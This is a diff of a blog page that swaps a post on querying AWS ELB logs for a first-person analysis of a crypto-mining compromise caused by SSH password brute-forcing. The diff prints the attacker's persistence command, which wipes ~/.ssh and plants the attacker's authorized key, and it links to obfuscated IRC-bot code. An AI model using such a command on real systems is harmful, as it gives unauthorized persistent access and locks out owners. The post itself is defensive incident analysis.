@@ -23,28 +23,31 @@
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <meta name="viewport" content="width=device-width,minimum-scale=1">
 
-  <title>Analyzing AWS ELB logs</title>
-  <meta name="description" content="You can get a ton of useful information about your web application by loading the ELB logs into Redshift and running some queries.">
-  <meta name="keywords" content="aws elb logs, redshift" />
+  <title>Anatomy of a crypto mining hack</title>
+  <meta name="description" content="One of my DigitalOcean instances got hacked by a crypto miner. The instance was insignificant but gave me the opportunity to poke around the code.">
+  <meta name="keywords" content="computer hacking, crypto mining hack" />
   <meta name="author" content="Dan Goldin">
 
-  <link rel="canonical" href="http://dangoldin.com/2018/02/20/analyzing-aws-elb-logs/">
+  <link rel="canonical" href="http://dangoldin.com/2020/05/29/anatomy-of-a-crypto-mining-hack/">
   <link rel="alternate" type="application/rss+xml" title="Dan Goldin" href="http://dangoldin.com/atom.xml">
 
   <meta name="twitter:card" content="summary" />
   <meta name="twitter:site" content="@dangoldin" />
-  <meta name="twitter:title" content="Analyzing AWS ELB logs" />
+  <meta name="twitter:title" content="Anatomy of a crypto mining hack" />
 
   <meta property="og:type"                content="website" />
   <meta property="og:site_name"           content="Dan Goldin" />
-  <meta property="og:url"                 content="http://dangoldin.com/2018/02/20/analyzing-aws-elb-logs/" />
-  <meta property="og:title"               content="Analyzing AWS ELB logs" />
+  <meta property="og:url"                 content="http://dangoldin.com/2020/05/29/anatomy-of-a-crypto-mining-hack/" />
+  <meta property="og:title"               content="Anatomy of a crypto mining hack" />
 
   
-  <meta property="og:description"         content="You can get a ton of useful information about your web application by loading the ELB logs into Redshift and running some queries." />
-  <meta name="twitter:description"        content="You can get a ton of useful information about your web application by loading the ELB logs into Redshift and running some queries." />
+  <meta property="og:description"         content="One of my DigitalOcean instances got hacked by a crypto miner. The instance was insignificant but gave me the opportunity to poke around the code." />
+  <meta name="twitter:description"        content="One of my DigitalOcean instances got hacked by a crypto miner. The instance was insignificant but gave me the opportunity to poke around the code." />
   
 
+  
+  <meta property="og:image"               content="http://dangoldin.com/assets/static/images/digitalocean-cpu-alert.png" />
+  <meta name="twitter:image"              content="http://dangoldin.com/assets/static/images/digitalocean-cpu-alert.png" />
   
 
   <link rel="shortcut icon" type="image/png" href="/favicon.png">
@@ -54,11 +57,11 @@
 {
   "@context": "http://schema.org",
   "@type": "NewsArticle",
-  "mainEntityOfPage": "http://dangoldin.com/2018/02/20/analyzing-aws-elb-logs/",
-  "headline": "Analyzing AWS ELB logs",
-  "datePublished": "2018-02-20T00:00:00-05:00",
-  "dateModified": "2018-02-20T00:00:00-05:00",
-  "description": "Logging HTTP requests should be enabled for every application you run. When things go wrong, and they will, it’s often the first step to understand the probl...",
+  "mainEntityOfPage": "http://dangoldin.com/2020/05/29/anatomy-of-a-crypto-mining-hack/",
+  "headline": "Anatomy of a crypto mining hack",
+  "datePublished": "2020-05-29T00:00:00-04:00",
+  "dateModified": "2020-05-29T00:00:00-04:00",
+  "description": "A few months ago I set up a simple ftp server to help a friend. I took a few security shortcuts which came to bite me this week when I received an alert from...",
   "author": {
     "@type": "Person",
     "name": ""
@@ -724,72 +727,35 @@ table {
 <main class="content" role="main">
   <article class="post">
     <div class="post-meta">
-      <h1 class="post-title">Analyzing AWS ELB logs</h1>
-      <span class="date">20 February 2018</span>
+      <h1 class="post-title">Anatomy of a crypto mining hack</h1>
+      <span class="date">29 May 2020</span>
     </div>
 
     <section class="post-content">
       
-<p>Logging HTTP requests should be enabled for every application you run. When things go wrong, and they will, it’s often the first step to understand the problem. Unfortunately, logging isn’t always top of mind and is often forgotten. Luckily, if you use the Elastic Load Balancer (ELB) functionality within AWS you’re able to set up ELB logs that track every request and write it to an S3 bucket. The documentation is up on the <a href="https://docs.aws.amazon.com/elasticloadbalancing/latest/classic/access-log-collection.html">Amazon site</a> but there’s a surprising amount of information that’s hidden away in the logs. Since it’s Amazon and they want to make it as easy for you to use their various services together it’s simple to load the logs into Redshift and start digging into them via some basic queries.</p>
+<p>A few months ago I set up a simple ftp server to help a friend. I took a few security shortcuts which came to bite me this week when I received an alert from DigitalOcean that an instance was running hot.</p>
 
-<p>I wanted to highlight a few I used in the past couple of weeks to dig into an issue. Despite having a centralized logging system I still find it easier to just write SQL queries - it’s significantly more expressive than any log exploration tool I’ve used and allows me to exactly what I without any magic.</p>
+<amp-img src="/assets/static/images/digitalocean-cpu-alert.png" alt="DigitalOcean CPU Alert" width="503" height="280" layout="responsive"></amp-img>
 
-<figure class="highlight"><pre><code class="language-sql" data-lang="sql"><span class="c1">-- Load the data into Redshift</span>
-<span class="k">copy</span> <span class="n">elb_logs</span>
-<span class="k">from</span> <span class="s1">'s3://logdirs/.../us-east-1/2018/02/19/'</span>
-<span class="n">COMPUPDATE</span> <span class="k">OFF</span> <span class="n">CREDENTIALS</span> <span class="s1">'aws_access_key_id=KEY;aws_secret_access_key=SECRET'</span>
-<span class="k">delimiter</span> <span class="s1">' '</span>
-<span class="n">TIMEFORMAT</span> <span class="k">as</span> <span class="s1">'auto'</span>
-<span class="n">ACCEPTINVCHARS</span>
-<span class="n">REMOVEQUOTES</span>
-<span class="n">FILLRECORD</span>
-<span class="n">MAXERROR</span> <span class="k">as</span> <span class="mi">100000</span><span class="p">;</span>
+<p>I dug into it and noticed a series of processes being run by the ftp_user - the most impactful was a command called rsync. I’m familiar with rsync which syncs files across devices - and this was nothing like that. At this point I realized that I got hacked and quickly disabled the user and killed all its processes. The CPU usage dropped back to normal and now it was time to dig into the damage.</p>
 
-<span class="c1">-- Look at the distribution of ELB status codes</span>
-<span class="k">select</span> <span class="n">elbresponsecode</span><span class="p">,</span> <span class="k">count</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="k">as</span> <span class="n">cnt</span>
-<span class="k">from</span> <span class="n">elb_logs</span>
-<span class="k">group</span> <span class="k">by</span> <span class="n">elbresponsecode</span>
-<span class="k">order</span> <span class="k">by</span> <span class="n">elbresponsecode</span><span class="p">;</span>
+<p>Note that I’m far from a security engineer but am reasonably comfortable on the command line. The user was not a sudo account and this was a non critical instance so I wasn’t too worried about the impact. In fact, I actually enjoyed the exercise of digging in and trying to see how I was hacked and how the entire script worked.</p>
 
-<span class="c1">-- Look at the distribution of backend status codes</span>
-<span class="k">select</span> <span class="n">backendresponsecode</span><span class="p">,</span> <span class="k">count</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="k">as</span> <span class="n">cnt</span>
-<span class="k">from</span> <span class="n">elb_logs</span>
-<span class="k">group</span> <span class="k">by</span> <span class="n">backendresponsecode</span>
-<span class="k">order</span> <span class="k">by</span> <span class="n">backendresponsecode</span><span class="p">;</span>
+<p>The origin of the hack was that I was sloppy when I created the ftp account and gave it both a weak password and didn’t disable password-based authentication for SSH. This led to the attacker brute forcing the password and getting access to the ftp_user’s home folder on the instance. Once there, the attacker downloaded a bunch of code that both embedded itself in the system and then started running a miner.</p>
 
-<span class="c1">-- Look at distribution by both</span>
-<span class="k">select</span> <span class="n">elbresponsecode</span><span class="p">,</span> <span class="n">backendresponsecode</span><span class="p">,</span> <span class="k">count</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="k">as</span> <span class="n">cnt</span>
-<span class="k">from</span> <span class="n">elb_logs</span>
-<span class="k">group</span> <span class="k">by</span> <span class="n">elbresponsecode</span><span class="p">,</span> <span class="n">backendresponsecode</span>
-<span class="k">order</span> <span class="k">by</span> <span class="n">elbresponsecode</span><span class="p">;</span>
+<p>Before I got rid of the code I took the liberty of committing it to <a href="https://github.com/dangoldin/crypto-miner-hack">GitHub</a> in order to preserve and share with others. That also gave me the time to dig in and see how it actually worked.</p>
 
-<span class="c1">-- Look at distribution by both where they're unequal</span>
-<span class="c1">-- This highlights cases where the ELB was unable to reach the hosts</span>
-<span class="k">select</span> <span class="n">elbresponsecode</span><span class="p">,</span> <span class="n">backendresponsecode</span><span class="p">,</span> <span class="k">count</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="k">as</span> <span class="n">cnt</span>
-<span class="k">from</span> <span class="n">elb_logs</span>
-<span class="k">where</span> <span class="n">elbresponsecode</span> <span class="o">!=</span> <span class="n">backendresponsecode</span>
-<span class="k">group</span> <span class="k">by</span> <span class="n">elbresponsecode</span><span class="p">,</span> <span class="n">backendresponsecode</span>
-<span class="k">order</span> <span class="k">by</span> <span class="n">elbresponsecode</span><span class="p">;</span>
+<p>One of the first things I noticed was how obfuscated the code was. The file names and folders were either named after existing programs or were hidden files and directories. In addition, the names were completely nonsensical and intricately linked which made it difficult to trace the execution. I didn’t go through the code step by step by digging into the files and found a few interesting tidbits.</p>
 
-<span class="c1">-- A simple way to look at the request groups causing problems</span>
-<span class="k">select</span> <span class="n">split_part</span><span class="p">(</span><span class="n">httprequest</span><span class="p">,</span> <span class="s1">'?'</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span> <span class="k">as</span> <span class="n">httprequestbase</span><span class="p">,</span> <span class="k">count</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="k">as</span> <span class="n">cnt</span>
-<span class="k">from</span> <span class="n">elb_logs</span>
-<span class="k">where</span> <span class="n">elbresponsecode</span> <span class="o">&gt;=</span> <span class="mi">500</span>
-<span class="k">group</span> <span class="k">by</span> <span class="n">httprequestbase</span>
-<span class="k">order</span> <span class="k">by</span> <span class="n">cnt</span> <span class="k">desc</span><span class="p">;</span>
+<p>One was that the <a href="https://github.com/dangoldin/crypto-miner-hack/blob/69fae2599bff579e7c159c984c6a9e9087b22378/ftp_user/.configrc/b/run#L5">code created</a> a cron job that would wipe the .ssh folder and then add a single ssh key - thereby locking every other user out.</p>
 
-<span class="c1">-- For fun, we can also look at the number of errors by minute to see if we can spot a pattern</span>
-<span class="k">select</span> <span class="n">to_char</span><span class="p">(</span><span class="n">requesttime</span><span class="p">,</span> <span class="s1">'YYYY-MM-DD HH24:MI'</span><span class="p">)</span> <span class="k">as</span> <span class="n">datetime</span><span class="p">,</span>
-  <span class="k">sum</span><span class="p">(</span><span class="k">case</span> <span class="k">when</span> <span class="n">elbresponsecode</span> <span class="o">=</span> <span class="mi">500</span> <span class="k">then</span> <span class="mi">1</span> <span class="k">else</span> <span class="mi">0</span> <span class="k">end</span><span class="p">)</span> <span class="k">as</span> <span class="n">n500</span><span class="p">,</span>
-  <span class="k">sum</span><span class="p">(</span><span class="k">case</span> <span class="k">when</span> <span class="n">elbresponsecode</span> <span class="o">=</span> <span class="mi">501</span> <span class="k">then</span> <span class="mi">1</span> <span class="k">else</span> <span class="mi">0</span> <span class="k">end</span><span class="p">)</span> <span class="k">as</span> <span class="n">n501</span><span class="p">,</span>
-  <span class="k">sum</span><span class="p">(</span><span class="k">case</span> <span class="k">when</span> <span class="n">elbresponsecode</span> <span class="o">=</span> <span class="mi">502</span> <span class="k">then</span> <span class="mi">1</span> <span class="k">else</span> <span class="mi">0</span> <span class="k">end</span><span class="p">)</span> <span class="k">as</span> <span class="n">n502</span><span class="p">,</span>
-  <span class="k">sum</span><span class="p">(</span><span class="k">case</span> <span class="k">when</span> <span class="n">elbresponsecode</span> <span class="o">=</span> <span class="mi">503</span> <span class="k">then</span> <span class="mi">1</span> <span class="k">else</span> <span class="mi">0</span> <span class="k">end</span><span class="p">)</span> <span class="k">as</span> <span class="n">n503</span><span class="p">,</span>
-  <span class="k">sum</span><span class="p">(</span><span class="k">case</span> <span class="k">when</span> <span class="n">elbresponsecode</span> <span class="o">=</span> <span class="mi">504</span> <span class="k">then</span> <span class="mi">1</span> <span class="k">else</span> <span class="mi">0</span> <span class="k">end</span><span class="p">)</span> <span class="k">as</span> <span class="n">n504</span>
-<span class="k">from</span> <span class="n">elb_logs</span>
-<span class="k">where</span> <span class="n">elbresponsecode</span> <span class="o">&gt;=</span> <span class="mi">500</span>
-<span class="k">group</span> <span class="k">by</span> <span class="n">datetime</span>
-<span class="k">order</span> <span class="k">by</span> <span class="n">datetime</span><span class="p">;</span></code></pre></figure>
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nb">cd</span> ~ <span class="o">&amp;&amp;</span> <span class="nb">rm</span> <span class="nt">-rf</span> .ssh <span class="o">&amp;&amp;</span> <span class="nb">mkdir</span> .ssh <span class="o">&amp;&amp;</span> <span class="nb">echo</span> <span class="s2">"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"</span><span class="o">&gt;&gt;</span>.ssh/authorized_keys <span class="o">&amp;&amp;</span> <span class="nb">chmod</span> <span class="nt">-R</span> <span class="nv">go</span><span class="o">=</span> ~/.ssh</code></pre></figure>
 
+<p>Another was that there was a <a href="https://github.com/dangoldin/crypto-miner-hack/blob/69fae2599bff579e7c159c984c6a9e9087b22378/ftp_user/.configrc/a/init0">script to kill</a> other miners. I assume the motivation here was to realize that if this instance was dumb enough to get hacked then it was probably hacked by someone else already so let’s put a stop to that.</p>
+
+<p>The most interesting part was an <a href="https://github.com/dangoldin/crypto-miner-hack/blob/69fae2599bff579e7c159c984c6a9e9087b22378/ftp_user/.configrc/b/run#L4">encoded string</a> that was passed into the Perl interpreter. The first step decoded it into a highly obfuscated Perl program and the <a href="https://github.com/dangoldin/crypto-miner-hack/blob/master/ftp_user/.configrc/b/run_2_safe_obfuscated">subsequent step</a> executed it through an eval. The <a href="https://github.com/dangoldin/crypto-miner-hack/blob/master/ftp_user/.configrc/b/run_3_safe_decoded">code itself</a> is fascinating and those more knowledgeable figured out it was connecting and listening to commands from an IRC server.</p>
+
+<p>There’s a fascinating amount of research one can do here to understand everything the hackers managed to do and yet it’s a world most of us are only tangentially aware of. There are clear lessons here. One is to take security seriously even if it is a toy project - in this case both a strong password and limiting password-based SSH would have stopped the hack. The other is that even simpler monitoring is a huge help. If DigitalOcean had not sent me the alert my instance would still be mining cryptocoins. And the last one is that running a honeypot is an insightful experience and gives you a chance to learn something new and flex those debugging muscles.</p>
 
     </section>
 
@@ -806,8 +772,6 @@ table {
     
       <li><a href="/tags/##code-ref">#code </a></li>
     
-      <li><a href="/tags/##sql-ref">#sql </a></li>
-    
   
 
 
@@ -823,11 +787,11 @@ table {
     <div class="pagination">
       <ul>
       
-        <li class="prev"><a href="/2018/02/10/optimize-for-keyboard-shortcuts/" title="Optimize for keyboard shortcuts">&larr; Prev</a> | </li>
+        <li class="prev"><a href="/2020/05/27/metrics-logging-and-error-reporting/" title="Metrics, logging, and error reporting">&larr; Prev</a> | </li>
       
         <li><a href="/archive/">Archive</a></li>
       
-        <li class="next"> | <a href="/2018/02/25/retrieving-kindle-highlights/" title="Retrieving Kindle highlights">Next &rarr;</a></li>
+        <li class="next disabled"><a>Next &rarr;</a></li>
       
       </ul>
     </div>
@@ -838,7 +802,7 @@ table {
         sandbox="allow-forms allow-modals allow-popups allow-popups-to-escape-sandbox allow-same-origin allow-scripts"
         resizable
         frameborder="0"
-        src="https://s3.amazonaws.com/dangoldin.com/amp-disqus.html?url=http%3A%2F%2Fdangoldin.com%2F2018%2F02%2F20%2Fanalyzing-aws-elb-logs%2F&title=Analyzing+AWS+ELB+logs">
+        src="https://s3.amazonaws.com/dangoldin.com/amp-disqus.html?url=http%3A%2F%2Fdangoldin.com%2F2020%2F05%2F29%2Fanatomy-of-a-crypto-mining-hack%2F&title=Anatomy+of+a+crypto+mining+hack">
         <div overflow tabindex="0" role="button" aria-label="Read more">Read more!</div>
       </amp-iframe>
     </div>
